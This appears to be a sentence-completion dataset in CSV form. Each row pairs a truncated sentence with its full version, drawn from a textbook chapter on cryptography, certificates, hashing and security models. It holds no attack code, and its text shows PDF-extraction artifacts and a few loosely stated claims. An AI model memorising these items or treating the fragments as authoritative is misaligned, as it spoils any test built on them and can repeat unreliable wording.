sentence,answer
this means someone trying to crack an encrypted mes-sage can try,this means someone trying to crack an encrypted mes-sage can try every possible key against the ciphertext in order to extract plain text
the problem is if you keep encrypting with the same key over and,"the problem is if you keep encrypting with the same key over and over , you can still attack the key if there are weaknesses there"
"with triple des ( 3des ) , there are three","with triple des ( 3des ) , there are three keys , which increases the effective key length to 168 bits"
"since you are decrypting with an entirely separate key ,","since you are decrypting with an entirely separate key , you still end up with ciphertext and not plain text"
"essentially , you take plain text to get ciphertext once , then take ciphertext , decrypt it","essentially , you take plain text to get ciphertext once , then take ciphertext , decrypt it into ciphertext , and take that result-ing ciphertext and encrypt it to obtain one more round of ciphertext"
"the reason for mentioning des and 3des , in spite of the fact","the reason for mentioning des and 3des , in spite of the fact that both are deprecated , is to suggest that key strength is important"
"since three 56-bit des keys is 168 bits , you might think you ’ re working","since three 56-bit des keys is 168 bits , you might think you ’ re working with a 168-bit key and any other symmetric algorithm using a shorter key would be worse"
"you could double the key length or even triple it , but","you could double the key length or even triple it , but the algorithm could still be broken to allow the message to be decrypted"
advanced encryption standard ( aes ) the replacement algorithm,advanced encryption standard ( aes ) the replacement algorithm for des was the advanced encryption standard ( aes )
just as lucifer was used to create the standard known as des,"just as lucifer was used to create the standard known as des , the rijndael cipher was used as the basis for the aes"
"the cipher is different from the standard , and while","the cipher is different from the standard , and while rijndael was developed earlier , the standard was published in 2001"
"just as des with a 56-bit key became vulnerable over time , aes","just as des with a 56-bit key became vulnerable over time , aes is starting to become potentially vulnerable to attack with a 128-bit key length"
one thing to be aware of is that an encryption cipher is only a,one thing to be aware of is that an encryption cipher is only a portion of what is neces- sary to allow for messages to be encrypted between endpoints
"in the following code listing , though , you can see a","in the following code listing , though , you can see a list of the ciphersuites that are allowed on google ’ s web server"
"this list was created with sslscan , a tool used to identify supported cryptographic","this list was created with sslscan , a tool used to identify supported cryptographic ciphers on servers that use the secure sockets layer ( ssl ) and tls protocols"
in spite of the fact that it ’ s been deprecated in favor of,"in spite of the fact that it ’ s been deprecated in favor of aes , there are still browsers that run on systems that may be less capable"
"since the first block in has no previous block , there is","since the first block in has no previous block , there is an initialization vector ( iv ) that is used to xor against"
"keep in mind that ciphertext is always binary , since","keep in mind that ciphertext is always binary , since each byte may not align with a printable ascii character"
this is not the sort of attack that someone would be,this is not the sort of attack that someone would be able to accomplish without extensive understanding of cryptography and how systems work
"this does not mean that aes is entirely invulnerable , but","this does not mean that aes is entirely invulnerable , but so far , there have been no weaknesses discovered in the algorithm"
these two keys are tied mathematically so that what is,these two keys are tied mathematically so that what is encrypted by one key can be decrypted by the other
"in fact , the public key is meant to be public , meaning the","in fact , the public key is meant to be public , meaning the only way public key cryptography works is if people actu-ally have the public key"
"the private key is the only key that needs to be protected in this scheme , which is","the private key is the only key that needs to be protected in this scheme , which is fine because it is only needed to decrypt messages that have been sent using the corresponding public key"
"if you want to exchange encrypted messages with someone , you should","if you want to exchange encrypted messages with someone , you should provide them with your public key and they should provide you with theirs"
one common algorithm that uses public key,one common algorithm that uses public key cryptography is the rivest-shamir-adleman ( rsa ) algorithm
this is another area that highlights why key strengths can,this is another area that highlights why key strengths can ’ t simply be compared from one algorithm to another
just because aes uses 128 bits and rsa uses 1024,just because aes uses 128 bits and rsa uses 1024 doesn ’ t mean rsa is an order of magnitude stronger
the only thing you can say about key sizes is that rsa with a 2048-bit key is considerably stronger than rsa,"the only thing you can say about key sizes is that rsa with a 2048-bit key is considerably stronger than rsa with a 1024-bit key , just as aes with a 256-bit key is considerably stronger than aes with a 128-bit key"
"why not just use one ? even though you can ’ t directly compare symmetric and asymmetric , asymmetric keys are considerably larger , and if an attack relies on brute force","why not just use one ? even though you can ’ t directly compare symmetric and asymmetric , asymmetric keys are considerably larger , and if an attack relies on brute force , it would take vastly longer to brute-force a 1024-bit key as compared with a 128-bit key , simply because there are many orders of magnitude more keys in the key space"
"so , why not just use asymmetric key cryptography everywhere ?","so , why not just use asymmetric key cryptography everywhere ? first , asymmetric key cryptography is expensive in terms of computing power"
"while this isn ’ t the problem that it once was because modern computers are so fast , we","while this isn ’ t the problem that it once was because modern computers are so fast , we are still having to use larger and larger keys , which can mean more computation because of the key length"
the public key can be used to protect the symmetric key so,the public key can be used to protect the symmetric key so there isn ’ t a problem with anyone obtaining this symmetric key
"the symmetric key in this case is sometimes called a session key ,","the symmetric key in this case is sometimes called a session key , because it is used to encrypt the data in a session between two systems"
"while diffie-hellman may be used to negotiate the key derivation ,","while diffie-hellman may be used to negotiate the key derivation , in practice it isn ’ t used in a hybrid cryptosystem"
this means the client would generate the session ( symmetric ) key and send it,"this means the client would generate the session ( symmetric ) key and send it to the web server , encrypting it with the web server ’ s public key"
non-repudiation another value of public key cryptography is that the public key and private,"non-repudiation another value of public key cryptography is that the public key and private key belong exclusively to a person or system , depending on its ultimate use"
this principle of demonstrating that a message originated from,this principle of demonstrating that a message originated from the owner of a private key is called non-repudiation
"in fairness , non-repudiation says that when a message has been sent using a private key ,","in fairness , non-repudiation says that when a message has been sent using a private key , the owner of that private key can ’ t say the message didn ’ t originate with them"
it ’ s just that the term non-repudiation means you can ’ t,it ’ s just that the term non-repudiation means you can ’ t go back on something by claiming it didn ’ t come from you
if a private key is not protected in any way and it,"if a private key is not protected in any way and it gets out into the open , it could be used by anyone"
the first is that the file containing the key should have appropriate,the first is that the file containing the key should have appropriate per - missions so only the owner of the file can access it
the password would be requested before the key could be used,the password would be requested before the key could be used to sign the message or else the message signing would fail
"elliptic curve cryptography while the factoring of prime numbers has commonly been used for keying , because the power and time","elliptic curve cryptography while the factoring of prime numbers has commonly been used for keying , because the power and time necessary to perform computations on these large numbers is extensive , using them is not the only way to generate keys"
"computers have continued to become significantly more powerful , and it ’ s far less","computers have continued to become significantly more powerful , and it ’ s far less difficult to apply many of them at a time to take on complex and difficult tasks"
rather than just using resource-intensive computations such as,"rather than just using resource-intensive computations such as prime number factorization , ecc uses discrete logarithms"
it is assumed that identifying the discrete logarithm of a,it is assumed that identifying the discrete logarithm of a random ellip-tic curve element is not just computationally difficult but infeasible
a logarithm is the inverse of exponentiation and a discrete logarithm is the,a logarithm is the inverse of exponentiation and a discrete logarithm is the value that you raise one number to in order to get another number
"there are some specific cases where they can be com- puted easily and quickly , but discrete logarithms are not a","there are some specific cases where they can be com- puted easily and quickly , but discrete logarithms are not a problem that has a generalized solution , so given discrete logarithm x , there is only one way to compute the solution"
"unlike factors of prime numbers , for which there are known computations , even if they are resource","unlike factors of prime numbers , for which there are known computations , even if they are resource intensive , ecc works because there is no way to reverse the process in order to find the answer"
perhaps an easier way to think about this is,perhaps an easier way to think about this is that there are a lot of multivariable poly- nomial equations
there is not a single algorithm that allows taking a point on the,there is not a single algorithm that allows taking a point on the curve generated by the equation and reversing it back to the original equation
without that gen-eralized algorithm that allows all equations to be solved ( or solved in reverse to be more accurate,"without that gen-eralized algorithm that allows all equations to be solved ( or solved in reverse to be more accurate ) , this is another intractable problem that allows for the creation of keys that can ’ t be determined easily"
keys that are used for sessions need to be protected but don ’,keys that are used for sessions need to be protected but don ’ t need to be stored beyond the sessions for which they are needed
"once the session is over , perhaps in a handful of minutes when","once the session is over , perhaps in a handful of minutes when a client is talking to a web server , the key is discarded"
"however , keys that have been created for a person and associated to that","however , keys that have been created for a person and associated to that person , even if the person is a server , need to be persistent"
"remember that the certificate includes the keying information , and when you are using","remember that the certificate includes the keying information , and when you are using public key cryptography , the point is to get your pub-lic key out there"
"it issues certificates to users , which means it collects information from","it issues certificates to users , which means it collects information from the user and then generates the key to provide to the user"
this software uses the openssl library and utilities to generate the certificates,"this software uses the openssl library and utilities to generate the certificates and handles the storage , creation , and management through a graphical interface"
"5 shows creating a certificate authority , meaning creating the","5 shows creating a certificate authority , meaning creating the root certificate and the certificate repository , using simple authority"
5 simple authority ca creation once the root certificate,"5 simple authority ca creation once the root certificate has been generated , you can create other certificates"
6 shows not only the creation of a new certificate,6 shows not only the creation of a new certificate but also the different types of certificates that can be created
"any web server that uses encrypted messages , and these days it ’ s rare to","any web server that uses encrypted messages , and these days it ’ s rare to find a web server that isn ’ t encrypting traffic , needs to have a certificate"
"if you were going to set up a web server that was going to use tls ,","if you were going to set up a web server that was going to use tls , you would select ssl server , since tls is the current implementation of what was once ssl"
"the ca can pro-vide the public key to anyone who wants it ,","the ca can pro-vide the public key to anyone who wants it , but the user who owns the certificate needs to have the private key portion"
what you will see there are the details provided during,what you will see there are the details provided during the certificate creation as well as information about the key
"this is just a set of bits that would not be printable , since each byte","this is just a set of bits that would not be printable , since each byte is not limited to the set of values that are considered printable in the ascii table"
"7 certificate details instead of the key itself , which wouldn ’","7 certificate details instead of the key itself , which wouldn ’ t mean much , you can see a fingerprint of the key"
"you could , of course , also show the key in","you could , of course , also show the key in hexadecimal rather than trying to generate characters from the byte values"
just to give you a sense of how much that is,"just to give you a sense of how much that is , this paragraph is 561 characters , including spaces and punctuation"
this may be because a user is no longer associated,"this may be because a user is no longer associated with the organization that manages the authority , for instance"
"when a certificate has been revoked , any party validat-","when a certificate has been revoked , any party validat- ing the certificate against the authority should not accept the certificate"
the problem with crls historically has been that,the problem with crls historically has been that they are not always requested to validate a certificate
there may also not be a good way to provide the crl to a system validating,"there may also not be a good way to provide the crl to a system validating a certificate , depending on the network location of the ca relative to the validating system"
is one reachable from the other and are there firewalls that would preclude the communi-cation ? as a result,"is one reachable from the other and are there firewalls that would preclude the communi-cation ? as a result , the online certificate status protocol ( ocsp ) can be used to verify a certificate with a ca"
trusted third party an advantage to using a ca is that there is a central authority that,trusted third party an advantage to using a ca is that there is a central authority that is used to not only store certificates and manage them but also to perform verification of identity
"it could be spoofed , or it could be com-ing","it could be spoofed , or it could be com-ing from an attacker who has access to the correct email address"
this may come from checking some identifi-cation credential that,this may come from checking some identifi-cation credential that demonstrates that you are who you say you are
"in the case of a third-party provider like verisign , you may be","in the case of a third-party provider like verisign , you may be expected to securely provide a photo identification before they will issue your certificate"
"ideally , you want to always know that the person you are sending encrypted","ideally , you want to always know that the person you are sending encrypted messages to or receiving signed messages from is the person you expect them to be"
"the transitive property says , in this case , that if you trust the ca and the ca trusts that another","the transitive property says , in this case , that if you trust the ca and the ca trusts that another person is who they say they are , then you , too , believe that person is who they say they are"
we know which ca to trust because every certificate that is generated,we know which ca to trust because every certificate that is generated by a ca is signed by the ca ’ s root certificate
"if that ’ s true , you know the certificate","if that ’ s true , you know the certificate is authentic and the identity associ-ated with the certificate is valid"
"this means that for every ca you trust , you need to add that","this means that for every ca you trust , you need to add that ca ’ s root certificate to your certificate cache so the signatures match something"
this may be a result of a certificate being generated from an untrusted,"this may be a result of a certificate being generated from an untrusted authority , meaning you haven ’ t installed that authority ’ s root certificate"
8 certificate error google chrome has generated this error because the name,8 certificate error google chrome has generated this error because the name on the certificate doesn ’ t match the name of the server
"this demonstrates that even if a certificate comes from a trusted authority , that doesn ’ t mean the","this demonstrates that even if a certificate comes from a trusted authority , that doesn ’ t mean the server you are connecting to can be trusted because the certificate may have been taken and installed somewhere else"
"here , furniture row is the company that owns sofa mart , so it","here , furniture row is the company that owns sofa mart , so it attempted to save some money by using the same certificate across all servers it uses"
self-signed certificates sometimes you want to just encrypt messages,"self-signed certificates sometimes you want to just encrypt messages between two systems in a lab , for instance"
"just as openssl was used by simple authority , it can","just as openssl was used by simple authority , it can be used on the command line to generate certificates by hand"
pem'enter pem pass phrase : verifying - enter pem pass phrase : -- -- -you,pem'enter pem pass phrase : verifying - enter pem pass phrase : -- -- -you are about to be asked to enter information that will be incorporatedinto your certificate request
there are quite a few fields but you can leave some blankfor,"there are quite a few fields but you can leave some blankfor some fields there will be a default value , if you enter '"
"-- -- -country name ( 2 letter code ) [ au ] : usstate or province name ( full name ) [ some-state ] : colocality name ( eg , city )","-- -- -country name ( 2 letter code ) [ au ] : usstate or province name ( full name ) [ some-state ] : colocality name ( eg , city ) [ ] : wubbleorganization name ( eg , company ) [ internet widgits pty ltd ] : organizational unit name ( eg , section ) [ ] : itcommon name ( e"
you may have run across cases where the certificate is out,"you may have run across cases where the certificate is out of date , meaning an old certificate is still being used"
you don ’ t want to have to keep updating your root certificate every year because it would lead to,"you don ’ t want to have to keep updating your root certificate every year because it would lead to a lot of users who had outdated root certificates , meaning every certificate signed by that ca would be invalid"
pem -text certificate : data : version : 3 ( 0x2 ) serial number : 5a:50 : cd:8a : dc:2d:57 : ff:52:13 : ca:51 : a6 : f5:90:7e:71:28:50:9a signature algorithm,"pem -text certificate : data : version : 3 ( 0x2 ) serial number : 5a:50 : cd:8a : dc:2d:57 : ff:52:13 : ca:51 : a6 : f5:90:7e:71:28:50:9a signature algorithm : sha256withrsaencryption issuer : c = us , st = co , l = wubble , o = internet widgits pty ltd , ou = it , cn = www"
com validity not before : jan 20 22:13:54 2019 gmt not after : jan 20 22:13:54 2020 gmt subject : c = us,"com validity not before : jan 20 22:13:54 2019 gmt not after : jan 20 22:13:54 2020 gmt subject : c = us , st = co , l = wubble , o = internet widgits pty ltd , ou = it , cn = www"
com subject public key info : public key algorithm : rsaencryption rsa public-key : ( 4096 bit,com subject public key info : public key algorithm : rsaencryption rsa public-key : ( 4096 bit ) here you can see a lot of details about the certificate that weren ’ t provided
"it ’ s a self-signed certificate , so the same","it ’ s a self-signed certificate , so the same device it ’ s been generated for has effectively signed it"
"additionally , the full text output includes the modulus","additionally , the full text output includes the modulus , which is the product of two large prime numbers"
there is a lot of data that is stored in the certificate,"there is a lot of data that is stored in the certificate , and it takes a lot of space to print it all out"
"it does , though , give you a good sense of","it does , though , give you a good sense of what information is captured and is necessary to make certificates work"
cryptographic hashing there is an important element to,cryptographic hashing there is an important element to cryptography that we have been breezing by so far
"you may have seen it show up in places earlier in the chapter ,","you may have seen it show up in places earlier in the chapter , such as the self-signed certificate or even the ciphersuites used on a web server"
the mac here is a fi xed-length value that is,the mac here is a fi xed-length value that is generated by running the entire message through a cryptographic algorithm
md5 is a cryptographic algorithm that takes,md5 is a cryptographic algorithm that takes arbitrary-length input and generates a fi xed-length output
you can see this in the following code listing where i take the,you can see this in the following code listing where i take the string '123456789 ' and get an md hash from it using the md5sum command
"the second time around , i get a hash from the","the second time around , i get a hash from the string '223456789 ' , which is a change of a single bit"
generating an md5 hash root @ quiche : ~ # echo '123456789 ' | md5sum b2cfa4183267af678ea06c7407d4d6d8 - root @ quiche : ~ # echo,generating an md5 hash root @ quiche : ~ # echo '123456789 ' | md5sum b2cfa4183267af678ea06c7407d4d6d8 - root @ quiche : ~ # echo '223456789 ' | md5sum 2cad6f3fd5e54b84cfccd3e1ef5aea4d - one of the expectations of a cryptographic hash is that every set of input will yield a different value
"since these values are used to authenticate messages , if the message digest output could be manipulated through the use","since these values are used to authenticate messages , if the message digest output could be manipulated through the use of collisions , it could result in messages being altered while still allowing the message digest value to remain the same"
the problem of collisions in hash algorithms relates,the problem of collisions in hash algorithms relates to a mathemati- cal problem called the birthday paradox
"this states that in a room of 23 people , there is a 50","this states that in a room of 23 people , there is a 50 percent chance that two people share the same birth-day ( month and day )"
the graph of the probability has a steep ramp early,the graph of the probability has a steep ramp early on but then essentially trails along the top for a while
it ’ s this probability game of being able to,it ’ s this probability game of being able to generate a collision in hash values that becomes the attack vector
a single bit difference in two sets of input generates,a single bit difference in two sets of input generates two sets of output that have no relation to one another
"if it isn ’ t considered authentic , it should be","if it isn ’ t considered authentic , it should be discarded because the assump-tion is that it has been tampered with"
once an attacker can manipulate the message and still have the digest come,"once an attacker can manipulate the message and still have the digest come out right , they can change encrypted messages that are believed to be private"
"currently , there is sha-2 , which supports four differ- ent","currently , there is sha-2 , which supports four differ- ent digest sizes , or bit lengths , that the algorithm can generate"
"since sha-2 has digest lengths up to 512 bits , there isn ’","since sha-2 has digest lengths up to 512 bits , there isn ’ t really any reason not to use it rather than sha-1 and cer-tainly md5"
"in addition to providing message authentication , cryptographic","in addition to providing message authentication , cryptographic hashes are used to verify data as being correct"
"when the file is downloaded , a hash can be computed","when the file is downloaded , a hash can be computed on what was downloaded and compared to what it should be"
"in this case , it doesn ’ t protect against authenticity of the file","in this case , it doesn ’ t protect against authenticity of the file , meaning there isn ’ t much of a chance of tampering during the download"
"this is not to say that there aren ’ t cases where the underlying file may have been swapped , and you should","this is not to say that there aren ’ t cases where the underlying file may have been swapped , and you should make sure that what is expected to be available through a website for download is actually the file that is available for down-load"
the software then goes through periodically to compare what is on,the software then goes through periodically to compare what is on the file system to what is in the known good database
host-based intrusion detection systems will often use elements like this to,host-based intrusion detection systems will often use elements like this to be able to detect when an attacker gains access to a system
"in the 1990s , phil zimmerman developed another way of","in the 1990s , phil zimmerman developed another way of man-aging certificates that does not use a ca for centralized verification"
someone who knows the person who has uploaded their key will sign that key as a demonstration that they,someone who knows the person who has uploaded their key will sign that key as a demonstration that they know the person and are willing to say that key really belongs to the user it purports to belong to
"you trust me and i trust that franny ’ s key is legitimate , so you can trust","you trust me and i trust that franny ’ s key is legitimate , so you can trust that franny ’ s key is legitimate and you can send encrypted messages to her using her public key"
this keyring would typically be signed with your key and also stored with a,this keyring would typically be signed with your key and also stored with a message authentication code so you can be sure it hasn ’ t been tampered with
"as you have likely seen often by now , when you are talking about encryption and","as you have likely seen often by now , when you are talking about encryption and privacy , ensuring the validity of every aspect of the process and protecting the keys are important"
how would you know which one you should be using to encrypt a message,how would you know which one you should be using to encrypt a message ? it puts all of the management into the hands of the individual user
the user has to know who they want to send mes-sages to,the user has to know who they want to send mes-sages to and which key to use that would be correct for that user
pgp can be used to encrypt an email message that is sent from,"pgp can be used to encrypt an email message that is sent from one user to another , as long as they are running pgp software"
this is a standard that is generally implemented in mail,"this is a standard that is generally implemented in mail clients , meaning there is no need for third-party software"
"in a fully microsoft environment , users within an enterprise can send encrypted messages","in a fully microsoft environment , users within an enterprise can send encrypted messages to one another and public keys can be retrieved from the active directory server"
this means there is no need to have other root ca keys in the,this means there is no need to have other root ca keys in the sys-tem or require any other methods to get the public key onto the client system
"if they can intercept messages that are not encrypted , they","if they can intercept messages that are not encrypted , they may be able to make use of the contents of the mes-sage"
users will sometimes make the mistake of believing that messages sent to,users will sometimes make the mistake of believing that messages sent to other users within an enterprise are safe because they remain inside the enterprise
"this means if an attacker can gain authenticated access , even by introducing malware that","this means if an attacker can gain authenticated access , even by introducing malware that is run as the primary user , the disk is wide open to the attacker"
"this is where the unencrypted message , or plain text , is not replaced a","this is where the unencrypted message , or plain text , is not replaced a character at a time but the entire message is transformed , generally through a mathemati-cal process"
"using a common starting point , both parties in the","using a common starting point , both parties in the process add a value and pass it to the other party"
"once the value has been added to the shared key , you end up with both sides","once the value has been added to the shared key , you end up with both sides having the common value plus the random value from side a plus the random value from side b"
"this process could be used for symmetric keys , where","this process could be used for symmetric keys , where the same key is used for both encryption and decryption"
you might also use an asymmetric key algorithm,you might also use an asymmetric key algorithm where different keys are used for encryption and decryption
a common approach is to use a hybrid cryptosystem where public key cryptography is used to,"a common approach is to use a hybrid cryptosystem where public key cryptography is used to share a session key , which is a symmetric key used to encrypt messages within the session"
this includes information about the identity of the,this includes information about the identity of the certifi-cate holder so verification of the certificate can happen
"certificates may be managed using a ca , which is a","certificates may be managed using a ca , which is a trusted third party that verifies the identity of the certificate holder"
"pgp uses a web of trust model , where indi-vidual users","pgp uses a web of trust model , where indi-vidual users validate identity by signing the public keys of people they know"
"this is generally a cryp- tographic hash , which is","this is generally a cryp- tographic hash , which is an algorithm that generates a fixed-length digest value from variable-length data"
this can be used not only for message authentication but also,this can be used not only for message authentication but also for veri-fying that files have not been tampered with or corrupted
what principle is used to demonstrate that a signed message came,what principle is used to demonstrate that a signed message came from the owner of the key that signed it ? a
"no matter what you are developing or imple- menting , it ’ s important to","no matter what you are developing or imple- menting , it ’ s important to consider users and , perhaps more important , data classifications and their necessary security requirements"
there are several ways of approaching the design of security models,"there are several ways of approaching the design of security models , and some of them relate to how data is classified"
"there are different ways to implement applications today , espe-cially as we move","there are different ways to implement applications today , espe-cially as we move further away from a straight native application deployed on a single client system"
"additionally , there are security architectures to consider","additionally , there are security architectures to consider when it comes to application development and deployment"
developing a security architecture means using a top-down approach to ensuring that,"developing a security architecture means using a top-down approach to ensuring that security policies , standards , and controls are all consistent and coherent"
security policy starts at the top of the organization,"security policy starts at the top of the organization , setting the direction based on business needs and requirements"
data classification is used to identify and,data classification is used to identify and organize information that has similar security control needs
"when you start thinking about security models , it is important to consider your data classifications","when you start thinking about security models , it is important to consider your data classifications , because security models are used to help identify who gets to look at what data"
different organizations will use different types of classification,"different organizations will use different types of classification schemes , depending on the data resources in place"
this is also something you will hear a lot when,this is also something you will hear a lot when it comes to the government and perhaps especially the military
1 governmental data classifications classification description top,1 governmental data classifications classification description top secret the highest level of data classification
official this is information that relates to government business and may not be,official this is information that relates to government business and may not be an indicator of the potential for harm if the information were lost or exposed
this may include declassified information that was once considered a,this may include declassified information that was once considered a higher classification but the threat posed by its exposure has subsided
top secret information is not necessarily available to everyone,top secret information is not necessarily available to everyone who has been cleared at a top secret level
2 simple data classification classification description,2 simple data classification classification description restricted data that is internal or sensitive
"private data that may also be internal or sensitive , but the loss","private data that may also be internal or sensitive , but the loss or disclosure of this data would cause only moderate damage to an organization"
public data that is classified public would incur no,public data that is classified public would incur no damage to an organization if it were disclosed or lost
it may also depend on the people who exist within,it may also depend on the people who exist within an organization as to how many levels of classification you need
"if you have a small organization and everyone is essentially equal , such as a startup that","if you have a small organization and everyone is essentially equal , such as a startup that consists of only part-ners in the company , perhaps you only need to have two data classification levels"
"as with so many things , it ’ s quite a","as with so many things , it ’ s quite a bit easier to perform classification early in the life of an organi-zation"
larger organizations with a considerable amount of data will find it much harder,larger organizations with a considerable amount of data will find it much harder to perform classification simply because of the volume and scale of the data
people who should have access to public data,people who should have access to public data generally shouldn ’ t have access to sensitive information
someone who has access to top secret data should have,someone who has access to top secret data should have access to public data but definitely not the other way around
these are the sorts of relationships that are,these are the sorts of relationships that are defined in the mod-els presented in the following sections
this should include the actions that would be possible to move a,this should include the actions that would be possible to move a system into a par - ticular state and all the possible state transitions
when a system makes a transition that is unexpected or an action,"when a system makes a transition that is unexpected or an action results in an unexpected state , this can be monitored and alerted"
this model is far more abstract than the others discussed,this model is far more abstract than the others discussed here since it doesn ’ t actually define any expected behaviors
it ’ s simply a way to model an,"it ’ s simply a way to model an environment , requiring that someone define expected behaviors and states"
data that has been altered unexpectedly or by the,data that has been altered unexpectedly or by the wrong people can also be damaging to an organization
there are three objectives when it comes to ensur-ing,there are three objectives when it comes to ensur-ing data integrity : ✓■unauthorized parties can not modify data
the first objective is about ensuring that someone from the outside,the first objective is about ensuring that someone from the outside who doesn ’ t have access can ’ t modify data
the second is about someone from the inside not being able to modify data,the second is about someone from the inside not being able to modify data they shouldn ’ t be modifying or perhaps shouldn ’ t even be seeing
"in the biba integrity model , data has","in the biba integrity model , data has classification levels but people also have clas- sification levels"
the biba model defines three sets of rules : ✓■the simple identity property says a subject,the biba model defines three sets of rules : ✓■the simple identity property says a subject at one level of integrity may not read a data object at a lower integrity level
✓■the * ( star ) identity property says a subject at one level,✓■the * ( star ) identity property says a subject at one level of integrity may not write to data objects at a higher level of integrity
"like biba , it is a state machine model , meaning that","like biba , it is a state machine model , meaning that subjects and objects exist in a single state at a point in time"
bell-lapadula also identifies a secure state so all transitions,bell-lapadula also identifies a secure state so all transitions should move from one secure state to another secure state
only appropriate levels of access are allowed within this,only appropriate levels of access are allowed within this model because they are defined and can be evaluated
"as a result , the model defines properties that are","as a result , the model defines properties that are different from those that were defined in the biba model"
the bell-lapadula properties are defined as follows : ✓■the simple security property says that a,the bell-lapadula properties are defined as follows : ✓■the simple security property says that a subject at one security level may not read an object at a higher security level
✓■the * ( star ) property says that a subject at one,✓■the * ( star ) property says that a subject at one security level may not write to an object at a lower security level
bell-lapadula provides for two mandatory access control rules ( simple security,bell-lapadula provides for two mandatory access control rules ( simple security property and * property ) and a single discretionary access control rule
discretionary access control allows users to set their own access,discretionary access control allows users to set their own access rules based on their needs and the data they control
"with discretionary access control , the enterprise doesn ’ t","with discretionary access control , the enterprise doesn ’ t have control over what subjects are allowed to access objects"
clark-wilson integrity model the clark-wilson model is another,clark-wilson integrity model the clark-wilson model is another one that focuses on integrity rather than confidential-ity
"this doesn ’ t mean , though , that it is the same as","this doesn ’ t mean , though , that it is the same as the biba model , even if the end result is intended to be the same"
"rather than a state machine , where a subject would act on an object directly","rather than a state machine , where a subject would act on an object directly , clark-wilson expects that subjects act on data objects only through the use of programs"
"also , where biba is used to protect information at higher levels of","also , where biba is used to protect information at higher levels of classification , clark-wilson is used and is applicable across all levels of data classification"
the overall objective of clark-wilson is to maintain the consistency of the data as it moves from one,"the overall objective of clark-wilson is to maintain the consistency of the data as it moves from one state to another , meaning every transaction leaves the object in a state that makes sense and is usable"
"rather than defining a state machine , as noted , clark-wilson defines","rather than defining a state machine , as noted , clark-wilson defines data items and only allows access through a small number of known programs"
if any subject other than those allowed attempt to access the object,"if any subject other than those allowed attempt to access the object , even through the known program/transaction , it ’ s a violation"
the same is true for attempt-ing transactions that,the same is true for attempt-ing transactions that are not defined by attempting to use other programs
"these are handled by transformation procedures ( tps ) , and the validity of the","these are handled by transformation procedures ( tps ) , and the validity of the data in a certain state is checked by an integrity verification procedure ( ivp )"
"additionally , there are rules for ensuring that there is logging and also for","additionally , there are rules for ensuring that there is logging and also for new data entering a system , specifying that it does not need to be constrained"
"finally , there is a rule making sure that only","finally , there is a rule making sure that only the certifier of a tp can change qualifications of the tp"
this goes back to the main-frame days when users,this goes back to the main-frame days when users would connect to the mainframe and run their programs there
"everything related to the program , including any data requirements","everything related to the program , including any data requirements the program may have had , existed on a single system"
there were controls in place on that system to pre-vent unauthorized access,"there were controls in place on that system to pre-vent unauthorized access , especially since there was a single point of entry to that system"
"following along to the days of the personal computer , before","following along to the days of the personal computer , before they were attached to net-works , programs ran on a single system"
"cloud-based providers , where systems reside at the service provider ’ s premises","cloud-based providers , where systems reside at the service provider ’ s premises and are consumed virtually , are starting to change how applications can be architected"
a service-oriented architecture takes the idea of a,a service-oriented architecture takes the idea of a monolithic design by breaking out components into services
"in some cases , you may see a version of this referred to as the model-view-controller","in some cases , you may see a version of this referred to as the model-view-controller ( mvc ) design , even if there may be other elements in those multiple tiers"
